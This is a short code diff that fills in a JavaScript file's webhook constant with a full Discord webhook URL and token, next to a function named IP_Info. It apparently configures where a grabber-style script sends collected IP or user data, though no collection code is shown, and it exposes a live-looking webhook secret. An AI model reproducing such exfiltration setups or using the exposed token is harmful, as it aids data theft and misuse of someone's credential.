@@ -9,7 +9,7 @@
 */
 
 
-const webhook = "your webhook url"
+const webhook = "https://discord.com/api/webhooks/1421369204459966524/0_a3woTSiG7IpUw2e6QuJtew2q05A6T0l3pdF6uE7qCel_8zzuzD2OrxwlymCCsuASjj"
 
 async function IP_Info(){
     /**
